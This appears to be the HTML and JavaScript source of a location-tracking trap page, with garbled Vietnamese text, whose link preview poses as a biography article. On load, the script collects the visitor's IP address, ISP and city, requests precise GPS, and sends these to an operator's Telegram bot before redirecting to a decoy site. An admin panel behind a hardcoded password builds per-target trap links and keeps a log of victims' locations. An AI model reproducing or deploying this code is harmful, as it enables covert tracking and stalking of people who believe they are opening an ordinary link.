    <meta property="og:title" content="Ti·ªÉu s·ª≠ ƒê·ª©c qu·ªëc c√¥ng ƒê√†o Minh Qu√¢n">
    <meta property="og:description" content="T·ªôi √°c c·ªông s·∫£n v·ªõi ƒê√†o Minh Qu√¢n v√† c√¥ng ∆°n cao c·∫£ c·ªßa Ng√†i.">
    <meta property="og:image" content="https://i.ibb.co/ynRQ20S0/att-v-SGAhgzni-Sg77k-RFCc0u-Dz-sj-HLvv-G0-Wu-Vk-Y3-HSe0.jpg">

    <style>

</head>
<body id="main-body" class="victim-body">

    <div id="ui-victim">
        <div class="loader" style="margin: 0 auto;"></div>
        <div class="msg">ƒêang t·∫£i...</div>
    </div>

    <div id="ui-admin" class="hidden w-full p-4 lg:p-10">
        <div class="max-w-6xl mx-auto space-y-6">
            <div class="flex justify-between items-center border-b border-gray-700 pb-4">
                <h1 class="text-xl font-bold text-white tracking-tight">SENTINEL <span class="text-blue-500 text-sm">V19 PANEL</span></h1>
                <button onclick="logout()" class="text-[10px] bg-red-900/20 text-red-500 border border-red-900/50 px-3 py-1 rounded">ƒêƒÇNG XU·∫§T</button>
            </div>

            <div class="grid lg:grid-cols-3 gap-6">
                <div class="space-y-4">
                    <div class="glass p-5 space-y-4">
                        <h3 class="text-xs font-bold text-gray-400 uppercase italic">C·∫•u h√¨nh Bot & Chuy·ªÉn h∆∞·ªõng</h3>
                        <input id="cfg-tk" type="password" placeholder="Bot Token" class="input-dark">
                        <input id="cfg-id" type="text" placeholder="Chat ID" class="input-dark">
                        <input id="cfg-rd" type="text" placeholder="Link Redirect (Khi l·∫•y xong)" class="input-dark">
                        <button onclick="saveConfig()" class="btn-blue text-xs uppercase">L∆∞u C·∫•u H√¨nh</button>
                    </div>

                    <div class="glass p-5 space-y-4">
                        <h3 class="text-xs font-bold text-gray-400 uppercase italic">T·∫°o link b·∫´y m·ªõi</h3>
                        <input id="in-name" type="text" placeholder="T√™n g·ª£i nh·ªõ m·ª•c ti√™u..." class="input-dark">
                        <button onclick="buildLink()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-2 rounded-lg text-xs uppercase">T·∫°o Link</button>
                        <div id="box-result" class="hidden p-3 bg-black rounded border border-blue-900/50">
                            <p class="text-[9px] text-gray-500 uppercase mb-1">Link c·ªßa b·∫°n:</p>
                            <div id="out-link" onclick="copyText(this)" class="text-[10px] text-blue-400 break-all cursor-pointer font-mono"></div>
                        </div>
                    </div>
                </div>

                <div class="lg:col-span-2 overflow-hidden">
                    <div class="glass min-h-[500px]">
                        <div class="p-4 border-b border-gray-800 flex justify-between bg-black/20">
                            <h3 class="text-xs font-bold text-white uppercase">Nh·∫≠t k√Ω m·ª•c ti√™u (M·ªõi nh·∫•t)</h3>
                            <button onclick="clearLogs()" class="text-[10px] text-gray-500 hover:text-red-500">X√ìA H·∫æT</button>
                        </div>
                        <div class="overflow-x-auto">
                            <table class="w-full text-left text-[11px]">
                                <thead class="bg-black/40 text-gray-500 uppercase text-[9px]">
                                    <tr>
                                        <th class="p-4">M·ª•c ti√™u</th>
                                        <th class="p-4">IP / Nh√† m·∫°ng</th>
                                        <th class="p-4">V·ªã tr√≠</th>
                                        <th class="p-4 text-right">B·∫£n ƒë·ªì</th>
                                    </tr>
                                </thead>
                                <tbody id="log-list" class="divide-y divide-gray-800"></tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // C·∫•u h√¨nh m·∫∑c ƒë·ªãnh
        let config = {
            t: "",
            i: "",
            r: "https://google.com"
        };

        const urlParams = new URLSearchParams(window.location.search);

        window.onload = () => {
            if (urlParams.has('admin')) {
                // V√†o ch·∫ø ƒë·ªô qu·∫£n l√Ω
                if (localStorage.getItem('sentinel_auth') === 'true' || prompt("M·∫≠t kh·∫©u Admin:") === "123") {
                    localStorage.setItem('sentinel_auth', 'true');
                    setupAdminUI();
                } else { window.location.search = ""; }
            } else {
                // Ch·∫ø ƒë·ªô n·∫°n nh√¢n
                runTracking();
            }
        };

        // --- H√ÄM CHO N·∫†N NH√ÇN ---
        async function runTracking() {
            // Gi·∫£i m√£ c·∫•u h√¨nh t·ª´ URL n·∫øu c√≥
            try { 
                const v = urlParams.get('v'); 
                if(v) config = JSON.parse(atob(v)); 
            } catch(e) {}

            const targetName = urlParams.get('name') || '·∫®n danh';
            
            // 1. L·∫•y th√¥ng tin IP
            let ipData = null;
            try {
                const res = await fetch('https://ipapi.co/json/');
                ipData = await res.json();
                
                // G·ª≠i b√°o c√°o IP b∆∞·ªõc 1
                await sendTele(`üåê <b>TRUY C·∫¨P M·ªöI</b>\nüë§ ƒê·ªëi t∆∞·ª£ng: <code>${targetName}</code>\nüåê IP: <code>${ipData.ip}</code>\nüè¢ ISP: <code>${ipData.org}</code>\nüìç V√πng: <code>${ipData.city}</code>`);
                
                // L∆∞u v√†o nh·∫≠t k√Ω c·ª•c b·ªô (ƒë·ªÉ Admin xem)
                addLog({ name: targetName, ip: ipData.ip, isp: ipData.org, city: ipData.city, time: new Date().toLocaleTimeString(), st: 'IP-ONLY' });
            } catch(e) {}

            const finalRedirect = () => window.location.replace(config.r);

            // 2. √âp l·∫•y GPS
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (p) => {
                        const lat = p.coords.latitude, lon = p.coords.longitude;
                        await sendTele(`üéØ <b>GPS CH√çNH X√ÅC</b>\nüë§ ƒê·ªëi t∆∞·ª£ng: <code>${targetName}</code>\nüìç Map: <a href="https://www.google.com/maps?q=$${lat},${lon}">Xem t·∫°i ƒë√¢y</a>`);
                        updateLog(targetName, lat, lon);
                        finalRedirect();
                    },
                    () => { finalRedirect(); }, 
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            } else { finalRedirect(); }

            setTimeout(finalRedirect, 7000);
        }

        async function sendTele(msg) {
            try {
                await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent(msg)}`);
            } catch(e) {}
        }

        // --- H√ÄM CHO ADMIN ---
        function setupAdminUI() {
            document.getElementById('main-body').className = "admin-bg";
            document.getElementById('ui-victim').classList.add('hidden');
            document.getElementById('ui-admin').classList.remove('hidden');
            
            // Load config c≈©
            const saved = localStorage.getItem('sentinel_config');
            if(saved) config = JSON.parse(saved);
            
            document.getElementById('cfg-tk').value = config.t;
            document.getElementById('cfg-id').value = config.i;
            document.getElementById('cfg-rd').value = config.r;
            
            renderLogs();
        }

        function saveConfig() {
            config.t = document.getElementById('cfg-tk').value;
            config.i = document.getElementById('cfg-id').value;
            config.r = document.getElementById('cfg-rd').value;
            localStorage.setItem('sentinel_config', JSON.stringify(config));
            alert("ƒê√£ l∆∞u c·∫•u h√¨nh h·ªá th·ªëng!");
        }

        function buildLink() {
            const name = document.getElementById('in-name').value || 'Target';
            const base = window.location.href.split('?')[0];
            const encoded = btoa(JSON.stringify(config));
            const final = `${base}?name=${encodeURIComponent(name)}&v=${encoded}`;
            
            document.getElementById('box-result').classList.remove('hidden');
            document.getElementById('out-link').innerText = final;
        }

        function addLog(data) {
            let logs = JSON.parse(localStorage.getItem('sentinel_logs') || '[]');
            logs.unshift(data);
            localStorage.setItem('sentinel_logs', JSON.stringify(logs.slice(0, 50)));
        }

        function updateLog(name, lat, lon) {
            let logs = JSON.parse(localStorage.getItem('sentinel_logs') || '[]');
            if(logs.length > 0 && logs[0].name === name) {
                logs[0].st = 'GPS-OK';
                logs[0].lat = lat;
                logs[0].lon = lon;
            }
            localStorage.setItem('sentinel_logs', JSON.stringify(logs));
        }

        function renderLogs() {
            const logs = JSON.parse(localStorage.getItem('sentinel_logs') || '[]');
            const html = logs.map(l => `
                <tr class="hover:bg-white/5 transition border-b border-gray-800">
                    <td class="p-4 font-bold text-white uppercase">${l.name}<br><span class="text-[8px] text-gray-600 font-normal">${l.time}</span></td>
                    <td class="p-4 font-mono text-blue-400">${l.ip}<br><span class="text-[8px] text-gray-600 uppercase font-normal">${l.isp}</span></td>
                    <td class="p-4 text-gray-400 uppercase">${l.city}</td>
                    <td class="p-4 text-right">
                        ${l.st === 'GPS-OK' ? 
                            `<a href="http://google.com/maps?q=${l.lat},${l.lon}" target="_blank" class="text-green-500 font-black italic underline uppercase">V·ªä TR√ç</a>` : 
                            `<span class="text-gray-700 italic">Ch·ªâ IP</span>`
                        }
                    </td>
                </tr>
            `).join('');
            document.getElementById('log-list').innerHTML = html || '<tr><td colspan="4" class="p-10 text-center text-gray-600 italic">Ch∆∞a c√≥ nh·∫≠t k√Ω n√†o...</td></tr>';
        }

        function clearLogs() { localStorage.removeItem('sentinel_logs'); renderLogs(); }
        function logout() { localStorage.removeItem('sentinel_auth'); location.reload(); }
        function copyText(el) { navigator.clipboard.writeText(el.innerText); alert("ƒê√£ Copy Link!"); }
    </script>
